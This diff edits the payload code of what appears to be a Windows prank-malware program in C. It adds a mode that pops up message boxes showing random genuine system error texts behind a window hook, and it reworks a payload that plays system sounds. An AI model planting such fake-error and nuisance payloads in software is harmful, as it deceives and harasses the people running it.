@@ -1,11 +1,26 @@
 #include "Payloads.h"
 #include "Utils.h"
 #include "GDI.h"
+#include "Errors.h"
 
 #pragma region Message Box Payload
-PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style) {
+PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style, int mode) {
 	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
-	MessageBoxW(NULL, text, label, style);
+
+	if (mode == 1) {
+		LPWSTR msg = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 8192*sizeof(WCHAR));
+
+		while (msg[0] == 0) {
+			FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL,
+				errorIds[random() % ERROR_COUNT], MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), msg, 8192, NULL);
+		}
+
+		MessageBoxW(NULL, msg, label, style);
+		LocalFree(msg);
+	} else {
+		MessageBoxW(NULL, text, label, style);
+	}
+
 	UnhookWindowsHookEx(hook);
 }
 
@@ -48,14 +63,17 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 #pragma endregion
 
 #pragma region Sound Payload
-const char *sounds[] = {
-	"SystemHand",
-	"SystemQuestion",
-	"SystemExclamation"
+const unsigned long sounds[] = {
+	SND_ALIAS_SYSTEMHAND,
+	SND_ALIAS_SYSTEMEXCLAMATION,
+	SND_ALIAS_SYSTEMASTERISK,
+	SND_ALIAS_SYSTEMQUESTION,
+	SND_ALIAS_SYSTEMSTART,
+	SND_ALIAS_SYSTEMEXIT
 };
 
-PAYLOAD payloadSound() {
-	PlaySoundA(sounds[random() % (sizeof(sounds) / sizeof(char *))], GetModuleHandle(NULL), SND_ASYNC);
+PAYLOAD payloadSound(int sound) {
+	PlaySoundA((LPCSTR)sounds[sound], GetModuleHandle(NULL), SND_ASYNC | SND_ALIAS_ID);
 }
 #pragma endregion
 
